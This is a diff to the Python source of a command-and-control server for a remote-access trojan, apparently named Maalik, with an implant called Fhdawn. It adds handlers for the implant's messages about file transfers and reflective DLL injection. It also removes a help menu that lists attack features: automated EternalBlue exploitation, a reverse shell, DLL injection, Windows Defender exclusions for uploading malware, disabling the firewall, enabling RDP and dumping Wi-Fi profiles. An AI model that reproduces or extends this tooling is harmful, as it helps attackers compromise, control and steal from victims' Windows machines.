@@ -63,6 +63,7 @@ class ClientManage:
         location = clients.index(self.client_socket)
         clients.remove(clients[location])
         iplist.remove(iplist[location])
+        hostList.remove(iplist[location])
 
     def DIRMONITOR(self, check_a_file):
         location = clients.index(self.client_socket)
@@ -620,6 +621,7 @@ Open Ports
                 elif(main == "upload"):
                     shellmode = True
                     filetransfer()
+                    time.sleep(2)
                     shellmode = False
                 elif(main == "download"):
                     filename = input("[+] File : ")
@@ -633,64 +635,7 @@ Open Ports
                     DLLTransfer()
                     shellmode = False
                 elif(main == "help"):
-                    print(Style.BRIGHT + Fore.WHITE + """
-                    HELP
-                    ----------------------------------
-                    -> Session Core Commands :
-                    -. show options - View Maalik Attack Options.
-                    -. show targets - View Scanned Targets.
-                    -. set target < target > - Set a Target to Attack.*
-                    -. set attackport < port > - Set Target Port to Attack.*
-                    -. set exploitport < port > - Set Port to send Exploits on (Default is random).*
-                    -. show info - Show information on the Selected Target.
-                    -. clear_hosts - Clear All Hosts.
-                    -. clear_ports - Clear all Ports.
-                    -. run - Start Pivoting Tunnel.
-                    -. run autoblue - Automatically runs Eternal Blue on the set Target.
-
-                    ----------------------------------
-                    -> Session Commands :
-                    -. help - Print this help message.
-                    -. ls - List files in current directory.
-                    -. cd < dir > - Go in another directory.
-                    -. osinfo - systeminfo output.
-                    -. delete - delete file.
-                    -. dir_monitor - Monitor files in current directory.
-                    -. process_monitor - Monitor a process.
-                    -. shell - Reverse shell.
-                    -. execute - Execute a file.
-                    -. execargs - Execute a file with command line arguments.
-                    -. clientinfo - View basic information of FHDAWN.
-                    -. port_scan - Scan for open ports on a Host.
-                    -. tasklist - View Running Processes.
-                    -. taskkill - Kill Running Process.
-                    -. host_sweep - Get all hostnames of scanned targets or specific IP (use -h to specify ip).
-                    -. upload - Upload file.
-                    -. download - Download file.
-                    -. dllinject - Reflective DLL Injection. Load your own DLL.
-
-                    POST Exploitation Specific 
-                    ----------------------------------
-                    -. netuser - List users.
-                    -. systeminfo - View full System Information.
-                    -. driverquery - View all Drivers.
-                    -. tasklist - Get list of running processes.
-                    -. drives - Get Available Drive Letters.
-                    -. set - Get all envoironment variables. 
-                    -. qwinsta - Displays information about sessions on a Remote Desktop Session Host server.
-                    -. network_scan - Scan the network.
-                    -. netshall - Acronym for 'netsh wlan show profiles'.
-                    -. windefender_exclude - Add Windows Defender Exclusions.
-                      - To Upload Malware, add Exclusion and upload malware to that directory.
-                    -. rdp_enable - Enable Remote Desktop.
-                    -. rdp_disable - Disable Remote Desktop.
-                    -. firewall_off - Disable Firewall.
-                    -. firewall_on - Enable firewall.
-                    -. portfwd - Forward a PORT on the Remote PC.
-                    -. portfwd_reset - Reset all forwarded Ports.
-                    
-                    """
-                    )
+                    print(help)
             except KeyboardInterrupt:
                 print("[X] Interrupt, Type exit to Exit session.")
 
@@ -748,7 +693,8 @@ Open Ports
                 except Exception as e:
                     print("[X] Error : " + str(e))
                     pass
-
+                
+                # Fhdawn reporting an Open Port on a Host
                 if(client_data.startswith("OPENPORT")):
                     # OPENPORT:IP,Port
                     parse = client_data.split(":")
@@ -772,6 +718,7 @@ Open Ports
                     if(hostinfo not in self.remote_hosts_list):
                         self.remote_hosts_list.append(hostinfo)
                 
+                # Fhdawn wants to send us a file
                 elif(client_data.startswith("FILE")):
                     try:
                         fileinfo = client_data.split(":") #FILE:filename.txt:555
@@ -791,10 +738,42 @@ Open Ports
                                 if not data: break
                             incoming_file.write(data)
                         print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloaded '{fl}' => '{fd}'".format(fl=filename, fd=FinalF))
-                        
+
                     except Exception as e:
                         print("[X] Error : " + str(e))
+                        print("[i] File Download Information : " + client_data)
+                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
+                        print("[i] Please report this bug to developer with the information above.")
                         pass
+                
+                # File was recevied by Fhdawn
+                elif(client_data.startswith("F_OK")):
+                    try:
+                        fileinfo = client_data.split(":")
+                        print(
+                            Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Uploaded {filename} ({filesize} bytes) to '{remote_path}' ..."
+                            .format(filename = fileinfo[1], filesize = fileinfo[2], remote_path = fileinfo[3]))
+
+                    except Exception as Error:
+                        print("[X] Error : " + str(Error))
+                        print("[i] File Received Information : " + client_data)
+                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
+                        print("[i] Please report this bug to developer with the information above.")
+                        pass
+
+                # Reflective DLL Injection was successfully done    
+                elif(client_data.startswith("DLL_OK")):
+                    try:
+                        fileinfo = client_data.split(":")
+                        print(Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Injected Reflective DLL into PID " + fileinfo[1] + " ...")
+
+                    except Exception as Error:
+                        print("[X] Error : " + str(Error))
+                        print("[i] Reflective DLL Inject Information : " + client_data)
+                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
+                        print("[i] Please report this bug to developer with the information above.")
+                        pass
+
                 elif(shellmode == True):
                     print("\n"+client_data) # No other information
 
@@ -883,7 +862,9 @@ def TCPServer():
         client, addr = server.accept()
         client.send("fhdawn_host".encode())
         try:
-            host = client.recv(1024).decode()
+            host = client.recv(1024).decode() # Receive User PC ' Test / TEST-PC '. I call this host. And all of these are saved in hostList
+            if("/" not in host):
+                print(Style.BRIGHT + Fore.YELLOW + "[ WARNING ] " + Style.RESET_ALL + "Client has sent an invalid User PC. This *may* not be Fhdawn.")
         except Exception as e:
             print(str(e))
             break
